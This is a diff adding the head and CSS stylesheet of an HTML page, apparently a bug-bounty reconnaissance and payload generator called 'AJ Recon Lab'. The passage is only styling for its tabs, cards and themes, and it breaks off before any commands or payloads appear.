@@ -1,0 +1,2290 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AJ Recon Lab – Full Bug Bounty Arsenal v3</title>
+<link href="https://fonts.googleapis.com/css2?family=Oxanium:wght@400;600;800&family=Fira+Code:wght@300;400;500&family=Syne+Mono&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --neon-green: #00ff41;
+    --neon-cyan: #00e5ff;
+    --neon-lime: #39ff14;
+    --dark-bg: #050a05;
+    --panel-bg: #0a120a;
+    --card-bg: #0d1a0d;
+    --border-green: rgba(0,255,65,0.25);
+    --border-cyan: rgba(0,229,255,0.25);
+    --text-dim: #4a7a4a;
+    --glow-green: 0 0 10px rgba(0,255,65,0.4), 0 0 20px rgba(0,255,65,0.2);
+    --glow-cyan: 0 0 10px rgba(0,229,255,0.4), 0 0 20px rgba(0,229,255,0.2);
+  }
+
+/* ── CYBER HACKER BG ANIMATIONS ── */
+  @keyframes charFloat { 0%, 100% { transform: translateY(0) perspective(800px) rotateY(-6deg); } 50% { transform: translateY(-14px) perspective(800px) rotateY(-6deg); } }
+  @keyframes auraPulse { 0%, 100% { opacity: .65; transform: scale(1); } 50% { opacity: 1; transform: scale(1.06); } }
+  @keyframes eyeGlow { 0%, 100% { opacity: .8; } 50% { opacity: 1; } }
+  @keyframes bolt { 0%, 100% { opacity: 0; stroke-dashoffset: 100; } 20%, 80% { opacity: 0; } 25%, 75% { opacity: .9; stroke-dashoffset: 0; } 50% { opacity: .4; stroke-dashoffset: 0; } }
+  @keyframes groundGlow { 0%, 100% { opacity: .4; transform: scaleX(1); } 50% { opacity: .7; transform: scaleX(1.12); } }
+
+  #anime-bg {
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    z-index: -1 !important; /* Ensure it stays behind everything */
+    pointer-events: none;
+    overflow: hidden;
+    transition: opacity 0.5s;
+  }
+
+  /* Fade out the cyber background when Light Theme is active */
+  body.light #anime-bg {
+    opacity: 0.05;
+    filter: grayscale(100%);
+  }
+  /* ── LIGHT THEME ── */
+  body.light {
+    --dark-bg:    #f0f4f0;
+    --panel-bg:   #ffffff;
+    --card-bg:    #f7fbf7;
+    --border-green: rgba(0,140,60,0.25);
+    --border-cyan:  rgba(0,120,180,0.25);
+    --neon-green: #007a2f;
+    --neon-cyan:  #005f9e;
+    --text-dim:   #4a6a4a;
+    --glow-green: 0 0 6px rgba(0,140,60,0.2);
+    --glow-cyan:  0 0 6px rgba(0,120,180,0.2);
+    background-color: var(--dark-bg);
+    color: #1a2e1a;
+  }
+
+  body.light::before {
+    background-image:
+      linear-gradient(rgba(0,140,60,0.06) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(0,140,60,0.06) 1px, transparent 1px);
+  }
+
+  body.light::after { opacity: 0; }
+
+  body.light .site-header {
+    background: linear-gradient(180deg, rgba(0,140,60,0.07) 0%, transparent 100%);
+    border-bottom: 1px solid rgba(0,140,60,0.2);
+  }
+
+  body.light .logo-text {
+    color: #006628;
+    text-shadow: none;
+  }
+
+  body.light .logo-bracket { color: #005f9e; text-shadow: none; }
+
+  body.light .subtitle { color: #005f9e; text-shadow: none; }
+
+  body.light .status-item { color: #3a6a3a; }
+  body.light .status-item::before { color: #007a2f; }
+
+  body.light .input-wrapper {
+    background: #fff;
+    border-color: rgba(0,140,60,0.3);
+    box-shadow: 0 2px 20px rgba(0,0,0,0.06);
+  }
+
+  body.light .input-wrapper::before { background: #fff; color: #005f9e; }
+  body.light .input-label { color: #005f9e; }
+
+  body.light #targetDomain {
+    background: #f4faf4;
+    border-color: rgba(0,140,60,0.3);
+    color: #1a2e1a;
+  }
+
+  body.light #targetDomain::placeholder { color: #7aaa7a; }
+  body.light #targetDomain:focus { border-color: #007a2f; box-shadow: 0 0 0 3px rgba(0,140,60,0.12); }
+
+  body.light .generate-btn {
+    border-color: #007a2f;
+    color: #007a2f;
+  }
+  body.light .generate-btn:hover { background: rgba(0,140,60,0.1); color: #004d1f; }
+
+  body.light .results-header { color: #005f9e; border-color: rgba(0,120,180,0.25); }
+  body.light .target-badge { background: rgba(0,120,180,0.08); border-color: rgba(0,120,180,0.3); color: #005f9e; }
+  body.light .expand-all-btn { color: #3a6a3a; border-color: rgba(0,140,60,0.3); }
+  body.light .expand-all-btn:hover { color: #007a2f; border-color: #007a2f; background: rgba(0,140,60,0.06); }
+
+  body.light .accordion-item { background: #fff; border-color: rgba(0,140,60,0.2); box-shadow: 0 1px 6px rgba(0,0,0,0.05); }
+  body.light .accordion-item:hover { border-color: rgba(0,140,60,0.4); }
+  body.light .accordion-item.open { border-color: #007a2f; box-shadow: 0 2px 16px rgba(0,140,60,0.1); }
+  body.light .accordion-header:hover { background: rgba(0,140,60,0.04); }
+
+  body.light .acc-num { color: #005f9e; background: rgba(0,120,180,0.08); border-color: rgba(0,120,180,0.3); }
+  body.light .acc-title { color: #1a2e1a; }
+  body.light .accordion-item.open .acc-title { color: #004d1f; }
+  body.light .acc-chevron { color: #007a2f; }
+
+  body.light .accordion-body { border-top-color: rgba(0,140,60,0.15); }
+
+  body.light .section-tag { color: #005f9e; border-color: rgba(0,120,180,0.3); background: rgba(0,120,180,0.06); }
+
+  body.light .cmd-card { background: #f4faf4; border-color: rgba(0,140,60,0.2); }
+  body.light .cmd-card:hover { border-color: rgba(0,140,60,0.45); box-shadow: 0 2px 10px rgba(0,0,0,0.06); }
+  body.light .cmd-header { background: rgba(0,0,0,0.03); border-bottom-color: rgba(0,140,60,0.1); }
+  body.light .cmd-desc { color: #2a4a2a; }
+
+  body.light .copy-btn { background: rgba(0,120,180,0.07); border-color: rgba(0,120,180,0.35); color: #005f9e; }
+  body.light .copy-btn:hover { background: rgba(0,120,180,0.14); color: #003d6e; box-shadow: 0 0 6px rgba(0,120,180,0.2); }
+  body.light .copy-btn.copied { background: rgba(0,140,60,0.1); border-color: #007a2f; color: #007a2f; }
+
+  body.light .cmd-code { color: #1a3a1a; background: transparent; }
+
+  body.light .workflow-box { background: rgba(0,120,180,0.04); border-color: rgba(0,120,180,0.22); }
+  body.light .workflow-box::before { color: #005f9e; border-color: rgba(0,120,180,0.2); }
+  body.light .workflow-steps li { color: #2a4a2a; border-bottom-color: rgba(0,140,60,0.1); }
+  body.light .workflow-steps li::before { color: #005f9e; }
+
+  body.light footer { color: #5a7a5a; border-top-color: rgba(0,140,60,0.2); }
+
+  /* Theme toggle button */
+  .theme-toggle {
+    position: fixed;
+    top: 1rem;
+    right: 1rem;
+    z-index: 10000;
+    background: var(--panel-bg);
+    border: 1px solid var(--border-green);
+    border-radius: 50px;
+    padding: 0.35rem 0.75rem;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+    font-family: 'Oxanium', monospace;
+    font-size: 0.68rem;
+    font-weight: 600;
+    color: #90c890;
+    letter-spacing: 0.08em;
+    transition: all 0.25s;
+    box-shadow: 0 2px 12px rgba(0,0,0,0.3);
+    user-select: none;
+  }
+
+  .theme-toggle:hover {
+    border-color: var(--neon-green);
+    color: var(--neon-green);
+    box-shadow: 0 2px 16px rgba(0,255,65,0.15);
+  }
+
+  body.light .theme-toggle {
+    background: #fff;
+    border-color: rgba(0,140,60,0.35);
+    color: #007a2f;
+    box-shadow: 0 2px 12px rgba(0,0,0,0.1);
+  }
+
+  body.light .theme-toggle:hover {
+    border-color: #007a2f;
+    box-shadow: 0 2px 16px rgba(0,140,60,0.15);
+  }
+
+  .toggle-icon { font-size: 0.9rem; transition: transform 0.4s; }
+  .theme-toggle:hover .toggle-icon { transform: rotate(20deg); }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background-color: var(--dark-bg);
+    color: var(--neon-green);
+    font-family: 'Fira Code', monospace;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  /* Matrix-like grid background */
+  body::before {
+    content: '';
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background-image:
+      linear-gradient(rgba(0,255,65,0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(0,255,65,0.03) 1px, transparent 1px);
+    background-size: 40px 40px;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  body > * { position: relative; z-index: 1; }
+
+  /* Scanline effect */
+  body::after {
+    content: '';
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(0,0,0,0.15) 2px,
+      rgba(0,0,0,0.15) 4px
+    );
+    pointer-events: none;
+    z-index: 9999;
+    opacity: 0.4;
+  }
+
+  /* Header */
+  .site-header {
+    background: linear-gradient(180deg, rgba(0,255,65,0.08) 0%, transparent 100%);
+    border-bottom: 1px solid var(--border-green);
+    padding: 2rem 1rem 1.5rem;
+    text-align: center;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .site-header::before {
+    content: '';
+    position: absolute;
+    top: -50%;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 600px;
+    height: 300px;
+    background: radial-gradient(ellipse, rgba(0,255,65,0.08) 0%, transparent 70%);
+    pointer-events: none;
+  }
+
+  .logo-text {
+    font-family: 'Oxanium', monospace;
+    font-weight: 800;
+    font-size: clamp(2rem, 6vw, 3.5rem);
+    color: var(--neon-green);
+    text-shadow: var(--glow-green);
+    letter-spacing: 0.04em;
+    line-height: 1.1;
+  }
+
+  .logo-bracket {
+    color: var(--neon-cyan);
+    text-shadow: var(--glow-cyan);
+  }
+
+  .subtitle {
+    font-family: 'Syne Mono', monospace;
+    color: var(--neon-cyan);
+    font-size: clamp(0.72rem, 2vw, 0.9rem);
+    letter-spacing: 0.18em;
+    text-transform: uppercase;
+    margin-top: 0.5rem;
+    text-shadow: var(--glow-cyan);
+  }
+
+  .status-bar {
+    display: flex;
+    justify-content: center;
+    gap: 1.5rem;
+    margin-top: 1rem;
+    font-size: 0.72rem;
+    color: #90b890;
+    font-family: 'Oxanium', monospace;
+    font-weight: 600;
+    letter-spacing: 0.06em;
+    flex-wrap: wrap;
+  }
+
+  .status-item::before { content: '● '; color: var(--neon-green); }
+
+  /* Input section */
+  .input-section {
+    max-width: 900px;
+    margin: 2.5rem auto;
+    padding: 0 1rem;
+  }
+
+  .input-wrapper {
+    background: var(--panel-bg);
+    border: 1px solid var(--border-green);
+    border-radius: 4px;
+    padding: 1.5rem;
+    box-shadow: 0 0 30px rgba(0,255,65,0.05), inset 0 0 30px rgba(0,0,0,0.5);
+    position: relative;
+  }
+
+  .input-wrapper::before {
+    content: '// TARGET ACQUISITION';
+    position: absolute;
+    top: -0.6rem;
+    left: 1rem;
+    background: var(--panel-bg);
+    padding: 0 0.5rem;
+    font-size: 0.68rem;
+    font-weight: 600;
+    color: #7de8ff;
+    font-family: 'Oxanium', monospace;
+    letter-spacing: 0.12em;
+  }
+
+  .input-label {
+    font-family: 'Oxanium', monospace;
+    font-size: 0.78rem;
+    font-weight: 600;
+    color: #7de8ff;
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    margin-bottom: 0.75rem;
+    display: block;
+  }
+
+  .input-row {
+    display: flex;
+    gap: 0.75rem;
+    flex-wrap: wrap;
+  }
+
+  #targetDomain {
+    flex: 1;
+    min-width: 200px;
+    background: var(--dark-bg);
+    border: 1px solid var(--border-green);
+    border-radius: 3px;
+    color: var(--neon-green);
+    font-family: 'Fira Code', monospace;
+    font-size: 1rem;
+    padding: 0.75rem 1rem;
+    outline: none;
+    transition: border-color 0.2s, box-shadow 0.2s;
+  }
+
+  #targetDomain::placeholder { color: var(--text-dim); }
+
+  #targetDomain:focus {
+    border-color: var(--neon-green);
+    box-shadow: var(--glow-green);
+  }
+
+  .generate-btn {
+    background: transparent;
+    border: 1px solid var(--neon-green);
+    color: var(--neon-green);
+    font-family: 'Oxanium', monospace;
+    font-weight: 700;
+    font-size: 0.8rem;
+    letter-spacing: 0.15em;
+    padding: 0.75rem 2rem;
+    cursor: pointer;
+    border-radius: 3px;
+    text-transform: uppercase;
+    transition: all 0.2s;
+    position: relative;
+    overflow: hidden;
+    white-space: nowrap;
+  }
+
+  .generate-btn::before {
+    content: '';
+    position: absolute;
+    top: 0; left: -100%;
+    width: 100%; height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(0,255,65,0.15), transparent);
+    transition: left 0.4s;
+  }
+
+  .generate-btn:hover {
+    background: rgba(0,255,65,0.1);
+    box-shadow: var(--glow-green);
+    color: #fff;
+  }
+
+  .generate-btn:hover::before { left: 100%; }
+  .generate-btn:active { transform: scale(0.98); }
+
+  /* Results */
+  #resultsContainer {
+    max-width: 1100px;
+    margin: 0 auto 4rem;
+    padding: 0 1rem;
+    display: none;
+  }
+
+  .results-header {
+    font-family: 'Oxanium', monospace;
+    font-size: 0.78rem;
+    font-weight: 600;
+    color: #7de8ff;
+    letter-spacing: 0.15em;
+    border-bottom: 1px solid var(--border-cyan);
+    padding-bottom: 0.75rem;
+    margin-bottom: 1.5rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    flex-wrap: wrap;
+    gap: 0.5rem;
+  }
+
+  .target-badge {
+    background: rgba(0,229,255,0.08);
+    border: 1px solid var(--border-cyan);
+    border-radius: 3px;
+    padding: 0.25rem 0.75rem;
+    color: var(--neon-cyan);
+    font-size: 0.8rem;
+    text-shadow: var(--glow-cyan);
+  }
+
+  /* Accordion */
+  .accordion-item {
+    background: var(--panel-bg);
+    border: 1px solid var(--border-green);
+    border-radius: 4px;
+    margin-bottom: 0.75rem;
+    overflow: hidden;
+    transition: border-color 0.2s;
+  }
+
+  .accordion-item:hover { border-color: rgba(0,255,65,0.4); }
+  .accordion-item.open { border-color: var(--neon-green); box-shadow: 0 0 15px rgba(0,255,65,0.08); }
+
+  .accordion-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 1rem 1.25rem;
+    cursor: pointer;
+    user-select: none;
+    transition: background 0.2s;
+    gap: 1rem;
+  }
+
+  .accordion-header:hover { background: rgba(0,255,65,0.04); }
+
+  .acc-left {
+    display: flex;
+    align-items: center;
+    gap: 0.75rem;
+    flex: 1;
+    min-width: 0;
+  }
+
+  .acc-num {
+    font-family: 'Oxanium', monospace;
+    font-size: 0.68rem;
+    font-weight: 700;
+    color: #7de8ff;
+    background: rgba(0,229,255,0.1);
+    border: 1px solid rgba(0,229,255,0.35);
+    border-radius: 3px;
+    padding: 0.18rem 0.5rem;
+    white-space: nowrap;
+  }
+
+  .acc-icon {
+    font-size: 1.05rem;
+    flex-shrink: 0;
+  }
+
+  .acc-title {
+    font-family: 'Oxanium', monospace;
+    font-size: clamp(0.82rem, 2vw, 1rem);
+    font-weight: 600;
+    color: #d4f5d4;
+    letter-spacing: 0.03em;
+  }
+
+  .accordion-item.open .acc-title { color: #ffffff; }
+
+  .acc-chevron {
+    color: var(--neon-green);
+    font-size: 0.8rem;
+    transition: transform 0.3s;
+    flex-shrink: 0;
+  }
+
+  .accordion-item.open .acc-chevron { transform: rotate(180deg); }
+
+  .accordion-body {
+    display: none;
+    padding: 0 1.25rem 1.25rem;
+    border-top: 1px solid var(--border-green);
+  }
+
+  .accordion-item.open .accordion-body { display: block; }
+
+  /* Command blocks */
+  .cmd-grid {
+    display: grid;
+    gap: 0.6rem;
+    margin-top: 1rem;
+  }
+
+  .cmd-card {
+    background: #0f1a0f;
+    border: 1px solid rgba(0,255,65,0.18);
+    border-radius: 4px;
+    overflow: hidden;
+    transition: border-color 0.2s, box-shadow 0.2s;
+  }
+
+  .cmd-card:hover {
+    border-color: rgba(0,255,65,0.45);
+    box-shadow: 0 0 12px rgba(0,255,65,0.06);
+  }
+
+  .cmd-header {
+    display: flex;
+    align-items: flex-start;
+    justify-content: space-between;
+    padding: 0.6rem 1rem;
+    gap: 1rem;
+    background: rgba(0,0,0,0.35);
+    border-bottom: 1px solid rgba(0,255,65,0.1);
+  }
+
+  .cmd-desc {
+    font-size: 0.78rem;
+    color: #c8e6c8;
+    font-family: 'Fira Code', monospace;
+    font-weight: 400;
+    letter-spacing: 0.01em;
+    line-height: 1.5;
+    flex: 1;
+  }
+
+  .copy-btn {
+    background: rgba(0,229,255,0.07);
+    border: 1px solid rgba(0,229,255,0.4);
+    color: #7de8ff;
+    font-family: 'Oxanium', monospace;
+    font-size: 0.65rem;
+    font-weight: 600;
+    letter-spacing: 0.1em;
+    padding: 0.25rem 0.65rem;
+    cursor: pointer;
+    border-radius: 3px;
+    white-space: nowrap;
+    transition: all 0.2s;
+    flex-shrink: 0;
+  }
+
+  .copy-btn:hover {
+    background: rgba(0,229,255,0.18);
+    color: #fff;
+    box-shadow: 0 0 8px rgba(0,229,255,0.3);
+  }
+
+  .copy-btn.copied {
+    background: rgba(0,255,65,0.12);
+    border-color: var(--neon-green);
+    color: var(--neon-green);
+    box-shadow: 0 0 8px rgba(0,255,65,0.25);
+  }
+
+  .cmd-code {
+    padding: 0.85rem 1rem;
+    font-family: 'Fira Code', monospace;
+    font-size: clamp(0.75rem, 1.8vw, 0.88rem);
+    color: #e2f5e2;
+    line-height: 1.8;
+    white-space: pre-wrap;
+    word-break: break-all;
+    overflow-x: auto;
+    font-weight: 400;
+    font-variant-ligatures: none;
+    letter-spacing: 0.01em;
+  }
+
+  /* Workflow box */
+  .workflow-box {
+    margin-top: 1.25rem;
+    background: rgba(0,229,255,0.04);
+    border: 1px solid rgba(0,229,255,0.22);
+    border-radius: 4px;
+    padding: 1rem 1.25rem;
+    position: relative;
+  }
+
+  .workflow-box::before {
+    content: '⚡ RECOMMENDED REAL-WORLD WORKFLOW';
+    display: block;
+    font-family: 'Oxanium', monospace;
+    font-size: 0.65rem;
+    font-weight: 600;
+    color: #7de8ff;
+    letter-spacing: 0.18em;
+    margin-bottom: 0.85rem;
+    border-bottom: 1px solid rgba(0,229,255,0.2);
+    padding-bottom: 0.55rem;
+  }
+
+  .workflow-steps {
+    list-style: none;
+    counter-reset: step;
+  }
+
+  .workflow-steps li {
+    counter-increment: step;
+    display: flex;
+    gap: 0.85rem;
+    padding: 0.45rem 0;
+    font-size: 0.8rem;
+    font-family: 'Fira Code', monospace;
+    color: #d4edd4;
+    line-height: 1.6;
+    border-bottom: 1px solid rgba(0,255,65,0.07);
+    letter-spacing: 0.01em;
+  }
+
+  .workflow-steps li:last-child { border-bottom: none; }
+
+  .workflow-steps li::before {
+    content: counter(step, decimal-leading-zero);
+    color: #7de8ff;
+    font-family: 'Oxanium', monospace;
+    font-size: 0.68rem;
+    font-weight: 700;
+    flex-shrink: 0;
+    margin-top: 0.15rem;
+  }
+
+  /* Section tag */
+  .section-tag {
+    display: inline-block;
+    font-family: 'Oxanium', monospace;
+    font-size: 0.62rem;
+    font-weight: 600;
+    color: #7de8ff;
+    border: 1px solid rgba(0,229,255,0.3);
+    border-radius: 3px;
+    padding: 0.12rem 0.45rem;
+    margin: 0.25rem 0.25rem 0 0;
+    background: rgba(0,229,255,0.07);
+    letter-spacing: 0.05em;
+  }
+
+  /* Scrollbar */
+  ::-webkit-scrollbar { width: 5px; height: 5px; }
+  ::-webkit-scrollbar-track { background: var(--dark-bg); }
+  ::-webkit-scrollbar-thumb { background: var(--border-green); border-radius: 10px; }
+  ::-webkit-scrollbar-thumb:hover { background: var(--neon-green); }
+
+  /* Loading animation */
+  .loading-bar {
+    height: 2px;
+    background: linear-gradient(90deg, transparent, var(--neon-green), var(--neon-cyan), var(--neon-green), transparent);
+    background-size: 200% 100%;
+    animation: scan 1.5s linear infinite;
+    margin: 1rem 0;
+  }
+
+  @keyframes scan {
+    0% { background-position: 200% 0; }
+    100% { background-position: -200% 0; }
+  }
+
+  /* Blink cursor */
+  @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
+  .cursor { animation: blink 1s infinite; }
+
+  /* Expand all button */
+  .expand-all-btn {
+    background: transparent;
+    border: 1px solid rgba(0,255,65,0.3);
+    color: #90c890;
+    font-family: 'Oxanium', monospace;
+    font-size: 0.68rem;
+    font-weight: 600;
+    letter-spacing: 0.1em;
+    padding: 0.28rem 0.85rem;
+    cursor: pointer;
+    border-radius: 3px;
+    transition: all 0.2s;
+  }
+  .expand-all-btn:hover { color: var(--neon-green); border-color: var(--neon-green); background: rgba(0,255,65,0.05); }
+
+  /* Footer */
+  footer {
+    text-align: center;
+    padding: 2rem 1rem;
+    font-family: 'Oxanium', monospace;
+    font-size: 0.7rem;
+    font-weight: 500;
+    color: #6a9a6a;
+    border-top: 1px solid var(--border-green);
+  }
+
+  /* ── SEARCH BAR ── */
+  .arsenal-controls {
+    display: flex; gap: 0.6rem; align-items: center; flex-wrap: wrap;
+    margin-bottom: 1.25rem; padding: 0.85rem 1rem;
+    background: var(--panel-bg); border: 1px solid var(--border-green);
+    border-radius: 4px;
+  }
+  .search-input {
+    flex: 1; min-width: 160px;
+    background: var(--dark-bg); border: 1px solid var(--border-green);
+    border-radius: 3px; color: var(--neon-green);
+    font-family: 'Fira Code', monospace; font-size: 0.85rem;
+    padding: 0.5rem 0.85rem; outline: none; transition: border-color 0.2s, box-shadow 0.2s;
+  }
+  .search-input::placeholder { color: var(--text-dim); }
+  .search-input:focus { border-color: var(--neon-green); box-shadow: var(--glow-green); }
+  .export-btn {
+    background: transparent; border: 1px solid var(--neon-cyan);
+    color: var(--neon-cyan); font-family: 'Oxanium', monospace;
+    font-weight: 700; font-size: 0.68rem; letter-spacing: 0.12em;
+    padding: 0.5rem 1.1rem; cursor: pointer; border-radius: 3px;
+    text-transform: uppercase; transition: all 0.2s; white-space: nowrap;
+  }
+  .export-btn:hover { background: rgba(0,229,255,0.1); color: #fff; box-shadow: var(--glow-cyan); }
+  .section-count-badge {
+    font-family: 'Oxanium', monospace; font-size: 0.65rem; font-weight: 700;
+    color: var(--text-dim); padding: 0 0.35rem; white-space: nowrap;
+    align-self: center;
+  }
+  .no-results-msg {
+    text-align: center; padding: 3rem 1rem;
+    font-family: 'Oxanium', monospace; font-size: 0.82rem;
+    color: var(--text-dim); display: none;
+  }
+  /* Copy-All button inside accordion header */
+  .copy-all-btn {
+    background: rgba(0,255,65,0.06); border: 1px solid rgba(0,255,65,0.3);
+    color: #7db87d; font-family: 'Oxanium', monospace;
+    font-size: 0.6rem; font-weight: 700; letter-spacing: 0.08em;
+    padding: 0.2rem 0.55rem; cursor: pointer; border-radius: 3px;
+    white-space: nowrap; transition: all 0.2s; flex-shrink: 0;
+  }
+  .copy-all-btn:hover { background: rgba(0,255,65,0.14); color: var(--neon-green); border-color: var(--neon-green); }
+  .copy-all-btn.copied { background: rgba(0,255,65,0.2); border-color: var(--neon-green); color: var(--neon-green); }
+
+  body.light .search-input { background: #f4faf4; border-color: rgba(0,140,60,0.3); color: #1a2e1a; }
+  body.light .search-input:focus { border-color: #007a2f; box-shadow: 0 0 0 3px rgba(0,140,60,0.12); }
+  body.light .export-btn { border-color: #005f9e; color: #005f9e; }
+  body.light .export-btn:hover { background: rgba(0,120,180,0.1); color: #003d6e; }
+  body.light .arsenal-controls { background: #fff; border-color: rgba(0,140,60,0.2); }
+  body.light .copy-all-btn { color: #3a6a3a; border-color: rgba(0,140,60,0.3); }
+  body.light .copy-all-btn:hover { color: #007a2f; border-color: #007a2f; }
+
+
+  @keyframes fadeInUp {
+    from { opacity: 0; transform: translateY(15px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  .accordion-item {
+    animation: fadeInUp 0.3s ease forwards;
+  }
+
+  .accordion-item:nth-child(1)  { animation-delay: 0.05s; }
+  .accordion-item:nth-child(2)  { animation-delay: 0.10s; }
+  .accordion-item:nth-child(3)  { animation-delay: 0.15s; }
+  .accordion-item:nth-child(4)  { animation-delay: 0.20s; }
+  .accordion-item:nth-child(5)  { animation-delay: 0.25s; }
+  .accordion-item:nth-child(6)  { animation-delay: 0.30s; }
+  .accordion-item:nth-child(7)  { animation-delay: 0.35s; }
+  .accordion-item:nth-child(8)  { animation-delay: 0.40s; }
+  .accordion-item:nth-child(9)  { animation-delay: 0.45s; }
+  .accordion-item:nth-child(10) { animation-delay: 0.50s; }
+  .accordion-item:nth-child(11) { animation-delay: 0.55s; }
+  .accordion-item:nth-child(12) { animation-delay: 0.60s; }
+  .accordion-item:nth-child(13) { animation-delay: 0.65s; }
+  .accordion-item:nth-child(14) { animation-delay: 0.70s; }
+  .accordion-item:nth-child(15) { animation-delay: 0.75s; }
+  .accordion-item:nth-child(16) { animation-delay: 0.80s; }
+  .accordion-item:nth-child(17) { animation-delay: 0.85s; }
+  .accordion-item:nth-child(18) { animation-delay: 0.90s; }
+  .accordion-item:nth-child(19) { animation-delay: 0.95s; }
+
+  @media (max-width: 600px) {
+    .cmd-code { font-size: 0.62rem; }
+    .acc-title { font-size: 0.78rem; }
+    .logo-text { font-size: 1.8rem; }
+  }
+
+  /* ── TAB NAVIGATION ── */
+  .tab-nav {
+    display: flex;
+    gap: 0.4rem;
+    flex-wrap: wrap;
+    justify-content: center;
+    padding: 1rem 1rem 0;
+    max-width: 1200px;
+    margin: 0 auto;
+    border-bottom: 1px solid var(--border-green);
+    position: sticky;
+    top: 0;
+    background: var(--dark-bg);
+    z-index: 500;
+  }
+
+  .tab-btn {
+    font-family: 'Oxanium', monospace;
+    font-size: 0.68rem;
+    font-weight: 700;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    padding: 0.45rem 1rem;
+    border: 1px solid var(--border-green);
+    border-bottom: none;
+    background: transparent;
+    color: #5a8a5a;
+    cursor: pointer;
+    border-radius: 4px 4px 0 0;
+    transition: all 0.2s;
+    white-space: nowrap;
+  }
+
+  .tab-btn:hover { color: var(--neon-green); border-color: rgba(0,255,65,0.5); background: rgba(0,255,65,0.04); }
+
+  .tab-btn.active {
+    color: var(--dark-bg);
+    background: var(--neon-green);
+    border-color: var(--neon-green);
+    box-shadow: var(--glow-green);
+  }
+
+  .tab-btn.tab-dork.active  { background: #00e5ff; border-color: #00e5ff; color: #050a05; box-shadow: var(--glow-cyan); }
+  .tab-btn.tab-pay.active   { background: #ff6b00; border-color: #ff6b00; color: #050a05; box-shadow: 0 0 10px rgba(255,107,0,0.5); }
+  .tab-btn.tab-wild.active  { background: #bf5fff; border-color: #bf5fff; color: #fff; box-shadow: 0 0 10px rgba(191,95,255,0.5); }
+
+  .tab-btn.tab-dork  { color: #5ab8c8; border-color: rgba(0,229,255,0.3); }
+  .tab-btn.tab-pay   { color: #c87840; border-color: rgba(255,107,0,0.3); }
+  .tab-btn.tab-wild  { color: #9a60d0; border-color: rgba(191,95,255,0.3); }
+
+  .tab-panel { display: none; }
+  .tab-panel.active { display: block; }
+
+  /* ── DORK TAB STYLES ── */
+  .dork-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(340px,1fr)); gap: 0.75rem; padding: 1.25rem 0; }
+
+  .dork-card {
+    background: rgba(0,229,255,0.04);
+    border: 1px solid rgba(0,229,255,0.2);
+    border-radius: 4px;
+    overflow: hidden;
+    transition: border-color 0.2s;
+  }
+  .dork-card:hover { border-color: rgba(0,229,255,0.5); }
+
+  .dork-cat {
+    font-family: 'Oxanium', monospace;
+    font-size: 0.6rem;
+    font-weight: 700;
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    color: #7de8ff;
+    background: rgba(0,229,255,0.08);
+    padding: 0.3rem 0.75rem;
+    border-bottom: 1px solid rgba(0,229,255,0.15);
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+
+  .dork-query {
+    font-family: 'Fira Code', monospace;
+    font-size: 0.8rem;
+    color: #e2f5e2;
+    padding: 0.65rem 0.75rem;
+    line-height: 1.7;
+    word-break: break-all;
+  }
+
+  .dork-filter-bar {
+    display: flex; gap: 0.5rem; flex-wrap: wrap; margin-bottom: 1rem;
+  }
+
+  .dork-filter {
+    font-family: 'Oxanium', monospace;
+    font-size: 0.65rem;
+    font-weight: 700;
+    letter-spacing: 0.1em;
+    padding: 0.3rem 0.75rem;
+    border: 1px solid rgba(0,229,255,0.3);
+    background: transparent;
+    color: #7de8ff;
+    cursor: pointer;
+    border-radius: 3px;
+    transition: all 0.2s;
+    text-transform: uppercase;
+  }
+  .dork-filter:hover, .dork-filter.active { background: rgba(0,229,255,0.12); border-color: #00e5ff; color: #fff; }
+
+  /* ── PAYLOAD TAB STYLES ── */
+  .payload-cat-header {
+    font-family: 'Oxanium', monospace;
+    font-size: 0.72rem;
+    font-weight: 800;
+    letter-spacing: 0.15em;
+    color: #ff6b00;
+    text-transform: uppercase;
+    border-bottom: 1px solid rgba(255,107,0,0.3);
+    padding: 1rem 0 0.5rem;
+    margin-top: 1.5rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+  .payload-cat-header:first-child { margin-top: 0; }
+
+  .payload-grid { display: grid; gap: 0.5rem; margin-top: 0.75rem; }
+
+  .payload-card {
+    background: rgba(255,107,0,0.04);
+    border: 1px solid rgba(255,107,0,0.2);
+    border-radius: 4px;
+    overflow: hidden;
+    transition: border-color 0.2s;
+  }
+  .payload-card:hover { border-color: rgba(255,107,0,0.5); }
+
+  .payload-label {
+    font-family: 'Fira Code', monospace;
+    font-size: 0.7rem;
+    color: #ffa060;
+    background: rgba(255,107,0,0.07);
+    padding: 0.3rem 0.75rem;
+    border-bottom: 1px solid rgba(255,107,0,0.12);
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+
+  .payload-code {
+    font-family: 'Fira Code', monospace;
+    font-size: 0.82rem;
+    color: #e2f5e2;
+    padding: 0.6rem 0.75rem;
+    line-height: 1.7;
+    white-space: pre-wrap;
+    word-break: break-all;
+  }
+
+  /* ── WILDCARD TAB STYLES ── */
+  .wild-intro {
+    background: rgba(191,95,255,0.06);
